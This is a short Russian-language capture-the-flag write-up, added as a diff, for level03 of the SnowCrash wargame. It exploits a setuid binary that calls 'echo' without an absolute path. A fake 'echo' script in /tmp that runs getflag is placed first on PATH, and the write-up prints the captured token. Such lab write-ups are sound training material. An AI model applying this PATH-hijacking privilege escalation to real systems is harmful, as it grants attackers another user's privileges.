@@ -1,0 +1,27 @@
+
+level03@SnowCrash:~$ ls -la
+...
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+....
+
+Права rws означают, что данный банарный файл будет выполняться не с привилегиями пользователя, который ее запустил, а с привилегиями владельца файла.
+Так как владельцем файла является flag03, вместо echo нужно выполнить getflag
+
+Oткрыв файл в нем была найдена строка 
+.../usr/bin/env echo Exploit me...
+Которая выполняет echo без абсолютного пути, следовталеьно этот бинарник можно подменить
+
+Cоздаем файл echo
+level03@SnowCrash:/tmp$ cat echo
+#!/bin/sh
+
+/bin/getflag
+
+Добавляем в начало данный путь
+level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
+
+
+Получаем токен
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
